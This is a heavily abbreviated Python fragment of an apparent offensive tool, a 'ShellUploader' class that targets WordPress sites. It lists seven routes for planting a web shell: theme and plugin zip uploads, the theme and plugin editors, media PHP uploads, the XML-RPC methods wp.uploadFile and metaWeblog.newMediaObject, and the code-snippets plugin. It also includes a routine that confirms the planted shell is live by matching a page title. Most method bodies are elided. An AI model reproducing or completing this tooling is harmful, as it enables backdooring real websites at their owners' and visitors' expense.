...
class ShellUploader:
    ...
    def deploy(self):
        ...
        surfaces = (
            ("theme-zip",      self._deploy_theme_zip),
            ("plugin",         self._deploy_plugin),
            ("theme-editor",   self._deploy_theme_editor),
            ("plugin-editor",  self._deploy_plugin_editor),
            ("media-php",      self._deploy_media),
            ("xmlrpc-php",     self._deploy_xmlrpc),
            ("code-snippets",  self._deploy_code_snippets),
        )
    ...
    def _xmlrpc_upload_file(self, fname, data):
        ...
        for method in ("wp.uploadFile", "metaWeblog.newMediaObject"):
            ...
            if m:
                ...
                return urllib.parse.urlsplit(full).path
        return None
    ...
    def _confirm_shell(self, url):
        ...
        Returns canonical live URL (with query) or None if 404 / wrong page.
        """
        if not url:
            return None
        ...
        if status == 404 or (status and status >= 400):
            return None
        text = body or ""
        # title confirmation (user shell marker)
        if _SHELL_OK_TITLE.lower() in text.lower():
            return probe
        # fallback: <title>...Runtime - File Configuration...</title>
